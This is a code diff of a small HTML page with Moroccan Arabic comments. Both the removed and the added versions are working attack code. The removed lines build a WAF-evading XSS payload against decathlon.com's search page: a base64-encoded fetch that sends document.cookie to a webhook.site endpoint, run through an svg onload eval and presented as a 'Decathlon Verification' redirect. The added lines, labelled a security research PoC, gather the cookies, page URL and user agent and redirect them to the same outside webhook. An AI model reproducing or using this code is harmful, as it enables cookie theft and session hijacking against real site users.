@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>Security Research PoC - Data Exfiltration Test</h1>
     <script>
-        // 1. الكود اللي باغي يتنفذ (سحب الكوكيز وصيفطهم للـ Webhook)
-        let secretCode = "fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data=' + btoa(document.cookie))";
+        var exfil_url = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
         
-        // 2. تشفير الكود بـ Base64 باش الـ WAF ما يقراهش
-        let encoded = btoa(secretCode);
-        
-        // 3. الـ Payload اللي كيهرب من الفلتر (استعملنا onerror حيت خفيفة)
-        // وحولنا الـ payload كامل لـ URL encoded باش يدوز سلاسل
-        let xss = "https://www.decathlon.com/search?q=%3Csvg/onload=eval(atob('" + encoded + "'))%3E";
+        // غانجمعو معلومات مخلطة: الكوكيز اللي مسموح بيهم + رابط الصفحة + التوقيت
+        var leaked_info = "URL: " + window.location.href + 
+                          " | Cookies: " + document.cookie + 
+                          " | UserAgent: " + navigator.userAgent;
 
-        // 4. تحويل الصفحة
-        window.location.href = xss;
+        var encoded_data = btoa(unescape(encodeURIComponent(leaked_info)));
+        
+        // صيفط الداتا
+        window.location.href = exfil_url + "?id=" + encoded_data;
     </script>
-    <h2>Redirecting to Decathlon Verification...</h2>
 </body>
 </html>
